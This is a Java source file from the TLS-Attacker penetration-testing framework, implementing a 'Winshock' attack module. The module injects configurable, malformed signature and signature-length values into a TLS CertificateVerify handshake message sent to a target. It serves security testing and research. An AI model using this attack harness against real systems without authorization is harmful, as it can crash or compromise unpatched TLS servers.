/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.WinshockCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.protocol.handshake.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.CertificateVerifyMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Allows to execute the Winshock attack, by setting the CertificateVerify
 * protocol message properties. I
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class WinshockAttack extends Attacker<WinshockCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(WinshockAttack.class);

    public WinshockAttack(WinshockCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByteArray signature = new ModifiableByteArray();
	signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
		.bigIntegerToByteArray(config.getSignature())));

	ModifiableInteger signatureLength = new ModifiableInteger();
	if (config.getSignatureLength() == null) {
	    signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
	} else {
	    signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
	}

	CertificateVerifyMessage cvm = (CertificateVerifyMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CERTIFICATE_VERIFY);
	cvm.setSignature(signature);
	cvm.setSignatureLength(signatureLength);

	workflowExecutor.executeWorkflow();

	transportHandler.closeConnection();
    }
}
